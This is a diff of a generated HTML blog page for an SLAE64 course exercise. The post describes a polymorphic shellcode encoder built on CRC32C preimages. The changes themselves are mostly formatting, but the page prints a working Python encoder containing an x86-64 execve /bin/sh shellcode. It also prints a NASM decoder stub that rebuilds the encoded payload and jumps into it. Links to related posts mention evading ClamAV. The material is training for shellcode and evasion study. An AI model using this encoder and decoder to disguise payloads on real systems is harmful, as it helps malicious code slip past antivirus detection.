@@ -110,8 +110,8 @@
                 <a href="../tag/nus.html" >NUS (3)</a> &#124; 
                 <a href="../tag/security.html" >Security (117)</a> &#124; 
                 <a href="../tag/server.html" >Server (26)</a> &#124; 
-                <a href="../tag/untagged.html" >Untagged (16)</a> &#124; 
-                <a href="../archives.html" >Archives (166)</a>
+                <a href="../tag/untagged.html" >Untagged (17)</a> &#124; 
+                <a href="../archives.html" >Archives (167)</a>
         </div>
     </div>
 
@@ -133,7 +133,7 @@
       </header><!-- .entry-header -->
       <div class="entry-content">
         <p>I decided to do something special for the custom encoder shellcode. I used the Intel SSE4.2 CRC32C function to encode the shellcode. CRC32 is a hash function, not an encoding function, so in order to make it an encoder, I had to compute the preimage for each possible byte of the final shellcode and store it into a state table. Since CRC32C has an even distribution, I decided to take the preimage for the 1000 inputs starting from 0x3 to 0x3ea. I will be using the first byte of the output for the encoding.</p>
-<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
 <span class="normal"> 4</span>
@@ -144,7 +144,7 @@
 <span class="normal"> 9</span>
 <span class="normal">10</span>
 <span class="normal">11</span>
-<span class="normal">12</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>crc32(0x3)   =  0x39892262
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code>crc32(0x3)   =  0x39892262
 
 crc32(0x1a7) =  0x00f7c439
 crc32(0x2e9) =  0x00194d4a
@@ -156,11 +156,11 @@ crc32(0x2cb) =  0x0a2e0f22
 crc32(0x36c) =  0x0ad9cb1b
 
 crc32(0x3ea) =  0x47022e8d
-</code></pre></div>
-</td></tr></table>
+</code></pre></div></td></tr></table></div>
+
 <p>As you can see, the inputs <code>0x1a7, 0x2e9, 0x34e</code> into the CRC function will return an output with the byte <code>0x00</code>, thus these 3 inputs will be used to encode <code>0x00</code>. After parsing the entire table, you will be able to construct a state table for all 255 values which can be used for your encoder. This encoder is polymorphic, each run of the python script will generate different shellcode because the encoder will randomly choose among the 3 to 4 options to encode each byte. Since I used 1000 inputs, the entire input space will fit into 1.5 bytes. Thus, this encoder will use 1.5 times the space of the original shellcode. It will read in 3 bytes and write out 2 bytes of original shellcode during each loop. </p>
 <p>Encoder.</p>
-<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
 <span class="normal"> 4</span>
@@ -246,7 +246,7 @@ crc32(0x3ea) =  0x47022e8d
 <span class="normal">84</span>
 <span class="normal">85</span>
 <span class="normal">86</span>
-<span class="normal">87</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">random</span>
+<span class="normal">87</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">import</span> <span class="nn">random</span>
 
 <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05</span><span class="s2">&quot;</span><span class="p">)</span>
 <span class="n">encoded</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
@@ -333,10 +333,10 @@ crc32(0x3ea) =  0x47022e8d
 <span class="nb">print</span> <span class="n">final</span>
 
 <span class="nb">print</span> <span class="s1">&#39;Len: </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">final</span><span class="p">))</span>
-</code></pre></div>
-</td></tr></table>
+</code></pre></div></td></tr></table></div>
+
 <p>Decoder.</p>
-<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
 <span class="normal"> 4</span>
@@ -377,50 +377,50 @@ crc32(0x3ea) =  0x47022e8d
 <span class="normal">39</span>
 <span class="normal">40</span>
 <span class="normal">41</span>
-<span class="normal">42</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="k">global </span><span class="nv">_start</span>
+<span class="normal">42</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">global</span><span class="w"> </span><span class="nv">_start</span><span class="w"></span>
 
-<span class="k">section </span><span class="nv">.text</span>
-<span class="nl">_start:</span>
+<span class="k">section</span><span class="w"> </span><span class="nv">.text</span><span class="w"></span>
+<span class="nl">_start:</span><span class="w"></span>
 
-    <span class="nf">jmp</span> <span class="nv">decoder</span> 
-    <span class="nl">encoded_shellcode:</span> <span class="kd">db</span> <span class="mh">0x17</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0x2a</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x92</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x37</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x1b</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0xc2</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x1d</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0xfc</span>
+<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">decoder</span><span class="w"> </span>
+<span class="w">    </span><span class="nl">encoded_shellcode:</span><span class="w"> </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x17</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x0d</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0x2a</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x92</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x37</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x1b</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0xc2</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x1d</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0xfc</span><span class="w"></span>
 
-<span class="nl">decoder:</span>
-    <span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rel</span> <span class="nv">encoded_shellcode</span><span class="p">]</span>
-    <span class="nf">lea</span> <span class="nb">rdi</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">]</span>
-    <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>
-    <span class="nf">xor</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rbx</span>
-    <span class="nf">xor</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rcx</span>
-    <span class="nf">xor</span> <span class="nb">r10</span><span class="p">,</span> <span class="nb">r10</span>
-    <span class="nf">xor</span> <span class="nb">r11</span><span class="p">,</span> <span class="nb">r11</span>
+<span class="nl">decoder:</span><span class="w"></span>
+<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">rel</span><span class="w"> </span><span class="nv">encoded_shellcode</span><span class="p">]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="p">]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rbx</span><span class="p">,</span><span class="w"> </span><span class="nb">rbx</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rcx</span><span class="p">,</span><span class="w"> </span><span class="nb">rcx</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w"></span>
 
-<span class="nl">decode:</span>             <span class="c1">; every 3 bytes of encoded shellcode encodes 2 bytes of actual shellcode</span>
-    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span> 
-    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rcx</span><span class="p">]</span>
-    <span class="nf">shl</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">8</span>
-    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rcx</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">]</span>
-    <span class="nf">shl</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">8</span>
-    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">rcx</span> <span class="o">+</span> <span class="mi">2</span> <span class="p">]</span>
-    <span class="nf">xor</span> <span class="nb">r8</span><span class="p">,</span> <span class="nb">r8</span>
-    <span class="nf">xor</span> <span class="nb">r9</span><span class="p">,</span> <span class="nb">r9</span>
-    <span class="nf">mov</span> <span class="nb">r8d</span><span class="p">,</span> <span class="nb">ebx</span>
-    <span class="nf">mov</span> <span class="nb">r9d</span><span class="p">,</span> <span class="nb">ebx</span>
-    <span class="nf">shr</span> <span class="nb">r8d</span><span class="p">,</span> <span class="mi">12</span>     <span class="c1">; r8d - 1st byte of shellcode (stored in first 12 bits)</span>
-    <span class="nf">shl</span> <span class="nb">r9d</span><span class="p">,</span> <span class="mi">20</span>     
-    <span class="nf">shr</span> <span class="nb">r9d</span><span class="p">,</span> <span class="mi">20</span>     <span class="c1">; r9d - 2nd byte of shellcode (stored in last 12 bits)</span>
-    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
-    <span class="nf">crc32</span> <span class="nb">r8d</span><span class="p">,</span> <span class="nb">eax</span> 
-    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
-    <span class="nf">crc32</span> <span class="nb">r9d</span><span class="p">,</span> <span class="nb">eax</span>
-    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">r11</span><span class="p">],</span> <span class="nb">r8b</span>
-    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="nb">r11</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="nb">r9b</span>
-    <span class="nf">cmp</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">60</span>              <span class="c1">; replace 60 with length of encoded shellcode in bytes</span>
-    <span class="nf">je</span> <span class="nv">encoded_shellcode</span>
-    <span class="nf">add</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">3</span>           <span class="c1">; cl - current position of encoded shellcode</span>
-    <span class="nf">add</span> <span class="nb">r11</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; r11 - current position of actual shellcode</span>
-    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">decode</span>
-</code></pre></div>
-</td></tr></table>
+<span class="nl">decode:</span><span class="w">             </span><span class="c1">; every 3 bytes of encoded shellcode encodes 2 bytes of actual shellcode</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">ebx</span><span class="p">,</span><span class="w"> </span><span class="nb">ebx</span><span class="w"> </span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">bl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">rcx</span><span class="p">]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">shl</span><span class="w"> </span><span class="nb">ebx</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">bl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">rcx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">shl</span><span class="w"> </span><span class="nb">ebx</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">bl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">rcx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r9</span><span class="p">,</span><span class="w"> </span><span class="nb">r9</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r8d</span><span class="p">,</span><span class="w"> </span><span class="nb">ebx</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r9d</span><span class="p">,</span><span class="w"> </span><span class="nb">ebx</span><span class="w"></span>
+<span class="w">    </span><span class="nf">shr</span><span class="w"> </span><span class="nb">r8d</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">     </span><span class="c1">; r8d - 1st byte of shellcode (stored in first 12 bits)</span><span class="w"></span>
+<span class="w">    </span><span class="nf">shl</span><span class="w"> </span><span class="nb">r9d</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="w">     </span>
+<span class="w">    </span><span class="nf">shr</span><span class="w"> </span><span class="nb">r9d</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="w">     </span><span class="c1">; r9d - 2nd byte of shellcode (stored in last 12 bits)</span><span class="w"></span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">eax</span><span class="p">,</span><span class="w"> </span><span class="nb">eax</span><span class="w"></span>
+<span class="w">    </span><span class="nf">crc32</span><span class="w"> </span><span class="nb">r8d</span><span class="p">,</span><span class="w"> </span><span class="nb">eax</span><span class="w"> </span>
+<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">eax</span><span class="p">,</span><span class="w"> </span><span class="nb">eax</span><span class="w"></span>
+<span class="w">    </span><span class="nf">crc32</span><span class="w"> </span><span class="nb">r9d</span><span class="p">,</span><span class="w"> </span><span class="nb">eax</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">r11</span><span class="p">],</span><span class="w"> </span><span class="nb">r8b</span><span class="w"></span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="p">[</span><span class="nb">rsi</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">r11</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="nb">r9b</span><span class="w"></span>
+<span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">cl</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span><span class="w">              </span><span class="c1">; replace 60 with length of encoded shellcode in bytes</span><span class="w"></span>
+<span class="w">    </span><span class="nf">je</span><span class="w"> </span><span class="nv">encoded_shellcode</span><span class="w"></span>
+<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">cl</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w">           </span><span class="c1">; cl - current position of encoded shellcode</span><span class="w"></span>
+<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">          </span><span class="c1">; r11 - current position of actual shellcode</span><span class="w"></span>
+<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">short</span><span class="w"> </span><span class="nv">decode</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+
 <p>This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
 <p>Student ID: SLAE64-XXXXX</p>
       </div><!-- .entry-content -->
@@ -442,14 +442,14 @@ crc32(0x3ea) =  0x47022e8d
               Since shellcode is usually very small in size, I have used RSA asymmetric encryption to encrypt the shellcode. Most of the code is boilerplate code so there is not much to talk about. Encryptor. ...</a>
               </blockquote>
               <blockquote class="similar_posts">
-              <a href="../articles/slae64-3-egghunter-shellcode.html"><b>SLAE64 #3 - Egghunter shellcode
-              (96% Similar) - </b>
-              As usual, I will only be touching on interesting or unique points in the shellcode. Line 25/26: To avoid having the egg in memory, I moved 0x5090508f into a register and incremented it to get ...</a>
+              <a href="../articles/slae64-6-polymorphic-shellcode.html"><b>SLAE64 #6 - Polymorphic shellcode
+              (97% Similar) - </b>
+              I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the ...</a>
               </blockquote>
               <blockquote class="similar_posts">
-              <a href="../articles/slae64-6-polymorphic-shellcode.html"><b>SLAE64 #6 - Polymorphic shellcode
+              <a href="../articles/slae64-5-msf-shellcode-analysis.html"><b>SLAE64 #5 - MSF shellcode analysis
               (96% Similar) - </b>
-              I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the ...</a>
+              I would be analysing chunks of the linux/x64/meterpreter/bind_tcp and the linux/x64/shell_bind_tcp and see how they differ. Although both are TCP bind shellcode, the primary difference among them ...</a>
               </blockquote>
           </div>
       </div>
@@ -482,7 +482,7 @@ crc32(0x3ea) =  0x47022e8d
                     <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                     <a href="../sitemap.xml">Sitemap</a><br />
                     This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
-                    Page generated on Sun Sep 11 18:45:36 2022<br />
+                    Page generated on Thu Sep 29 18:42:42 2022<br />
                     &copy; 2012-2022 <a href="..">Benjamin Lim</a> </div>
         </div>
       </div><!-- .site-info -->
